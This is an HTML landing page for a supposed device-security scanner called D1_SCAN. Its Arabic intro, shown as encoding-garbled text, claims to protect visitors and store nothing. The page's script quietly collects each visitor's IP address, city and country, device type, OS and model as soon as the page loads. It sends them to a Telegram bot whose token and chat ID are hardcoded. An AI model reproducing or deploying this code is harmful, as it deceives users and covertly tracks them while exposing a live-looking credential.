<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DEVO_63 Scan</title>
    <link rel="stylesheet" href="scan_page/style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
</head>
<body>
    <div class="container1" id="mainScreen">
    <div class="mxw">
 <div class="logo">
          <span class="d1">D1_SCAN</span>
          <span class="beta">beta version</span>
          </div>
        <p class="intro">
ุจุณู ุงููู ุงูุฑุญูู ุงูุฑุญููุ ูุงูุญูุฏ ููู ุฑุจ ุงูุนุงููููุ ูุงูุตูุงุฉ ูุงูุณูุงู ุนูู ุฎุงุชู ุงูุฃูุจูุงุก ู ุงููุฑุณูููุ ุฃูุง ุจุนุฏ:
<br>

ูู ุงูุขููุฉ ุงูุฃุฎูุฑุฉุ ูุงุญุธุช ุงูุชุดุงุฑูุง ูุงุณุนูุง ููููููุง ูุนูููุงุช ุงุฎุชุฑุงู ุงูุฃุฌูุฒุฉ ูุงูุญุณุงุจุงุช ูุบูุฑูุงุ ูุงูุชู ุบุงูุจูุง ูุง ุชููู ูุงุชุฌุฉ ุนู ููุงูุน ุฅููุชุฑูููุฉ. 
<br>

ูุฐุงุ ูุฑุฑุช ุฃู ุฃุจุฏุฃ ูุฐุง ุงููุดุฑูุน ุงูุฐู ูููู ุจูุญุต ุดุงูู ูุงูุชุดุงู ุฃู ุจูุงูุงุช ุฎุงุตุฉ ุจู ูุฏ ุชููู ุธุงูุฑุฉ ููุงููู ุงูููุงูุน ุจุดูู ุบูุฑ ููุตูุฏ. ุจุงูุฅุถุงูุฉ ุฅูู ุฐููุ ุณูู ุฃุฌุงูุฏ ููู ูููู ุงูููุจุน ุดุงููุงู  ูุญููู ูุงุชู ุงูุซุบุฑุงุช ุงูุฃูููุฉ ุงููุชูุงุฌุฏุฉ ูู ุฌูุงุฒูุ ุฅูู ุฌุงูุจ ุจุนุถ ุงููุตุงุฆุญ ุงูุชูุนููุฉ ุงููููุฉ.
<br>
<strong>  ๐  ูุน ุงูุชุฃููุฏ ุนูู ุฃูู ูุง ูุชู ุชุฎุฒูู ุฃู ูุดุงุฑูุฉ ุฃู ูุนูููุงุช ุฎุงุตุฉ ุจู.</strong>
        </p>
       <button class="button" onclick="window.location.href='scan_page/index.html'">ููุงููุ ุงุจุฏุฃ</button>
    </div></div>

<script>

// ุฏุงูุฉ ูุฌูุน ุนููุงู IP
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('โ ุฎุทุฃ ูู ุฌูุจ ุนููุงู IP:', error);
        return null;
    }
}

// ุฏุงูุฉ ููุญุตูู ุนูู ุงููููุน ุงูุฌุบุฑุงูู ุจูุงุกู ุนูู IP
async function getLocation(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return `${data.city}, ${data.country_name}`;
    } catch (error) {
        console.error('โ ุฎุทุฃ ูู ุฌูุจ ุงููููุน:', error);
        return 'ุบูุฑ ูุนุฑูู';
    }
}

// ุฏุงูุฉ ูุชุญุฏูุฏ ููุน ุงูุฌูุงุฒ ููุธุงู ุงูุชุดุบูู ูุงูุทุฑุงุฒ
function getDeviceInfo() {
    const userAgent = navigator.userAgent;

    let deviceType = 'ุบูุฑ ูุนุฑูู';
    if (/Mobi|Android/i.test(userAgent)) {
        deviceType = ' ูุงุชู ูุญููู';
    } else if (/Tablet|iPad/i.test(userAgent)) {
        deviceType = ' ุฌูุงุฒ ููุญู';
    } else {
        deviceType = ' ููุจููุชุฑ';
    }

    let os = 'ุบูุฑ ูุนุฑูู';
    if (/Android/i.test(userAgent)) {
        os = ' Android';
    } else if (/iOS|iPhone|iPad/i.test(userAgent)) {
        os = 'iOS';
    } else if (/Windows/i.test(userAgent)) {
        os = ' Windows';
    } else if (/Mac/i.test(userAgent)) {
        os = ' macOS';
    } else if (/Linux/i.test(userAgent)) {
        os = ' Linux';
    }

    let deviceModel = 'ุบูุฑ ูุชููุฑ';
    if (/Android/i.test(userAgent)) {
        const modelMatch = userAgent.match(/Build\/([^;]+)/);
        if (modelMatch) {
            deviceModel = modelMatch[1].split(';')[0].trim();
        }
    } else if (/iPhone|iPad/i.test(userAgent)) {
        const modelMatch = userAgent.match(/iPhone|iPad/);
        if (modelMatch) {
            deviceModel = modelMatch[0];
        }
    }

    return { deviceType, os, deviceModel };
}

// ุฏุงูุฉ ูุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู Telegram ุจุงุณุชุฎุฏุงู HTML
async function sendToBot(message) {
    const botToken = '7642723730:AAHLXI_yDwCV-1WOwY_8LQ2fBplaUB4sQ-I'; // ุงุณุชุจุฏู ูุฐุง ุจุชูููู ุงูุจูุช
    const chatId = '5962064921'; // ุงุณุชุจุฏู ูุฐุง ุจู chat_id ุงูุฎุงุต ุจู

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML' // ุงุณุชุฎุฏุงู HTML ูุชุญุณูู ุงูุชูุณูู
            })
        });

        const data = await response.json();
        if (data.ok) {
            console.log('โ ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู ุงูุจูุช ุจูุฌุงุญ!');
        } else {
            console.error('โ ูุดู ุฅุฑุณุงู ุงูุจูุงูุงุช:', data);
        }
    } catch (error) {
        console.error('๐จ ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุงูุฅุฑุณุงู:', error);
    }
}

// ุงูููุฏ ุงูุฑุฆูุณู
window.onload = async function() {
    const startTime = new Date(); // ููุช ุจุฏุก ุงูุฌูุณุฉ

    // ุฌูุน ุงููุนูููุงุช
    const ipAddress = await getIPAddress();
    const location = ipAddress ? await getLocation(ipAddress) : 'ุบูุฑ ูุนุฑูู';
    const { deviceType, os, deviceModel } = getDeviceInfo();
    const siteURL = window.location.href; // ุงูุญุตูู ุนูู ุฑุงุจุท ุงููููุน ุงูุญุงูู

    // ูุตู ุงูุชุงุฑูุฎ ูุงูููุช
    const entryDate = startTime.toLocaleDateString(); // ุชุงุฑูุฎ ุงูุฏุฎูู
    const entryTime = startTime.toLocaleTimeString(); // ููุช ุงูุฏุฎูู

    // ุชูุณูู ุงูุฑุณุงูุฉ ุจุงุณุชุฎุฏุงู HTML
    const entryMessage = `
๐ข <b>ุฏุฎูู ุฌุฏูุฏ ุฅูู ุงููููุน!</b>

๐ <b>ุนููุงู IP:</b> <code>${ipAddress || 'ุบูุฑ ูุนุฑูู'}</code>  
๐ <b>ุงููููุน:</b> <code>${location}</code>  
๐ฑ <b>ููุน ุงูุฌูุงุฒ:</b> <code>${deviceType}</code>  
๐ฅ <b>ูุธุงู ุงูุชุดุบูู:</b> <code>${os}</code>  
๐ <b>ุทุฑุงุฒ ุงูุฌูุงุฒ:</b> <code>${deviceModel}</code>  

๐ <b>ุชุงุฑูุฎ ุงูุฏุฎูู:</b> <code>${entryDate}</code>  
โฐ <b>ููุช ุงูุฏุฎูู:</b> <code>${entryTime}</code>  
๐ <b>ุฑุงุจุท ุงููููุน:</b> <a href="${siteURL}">${siteURL}</a>  
    `;

    await sendToBot(entryMessage);
};
</script>
</body>
</html>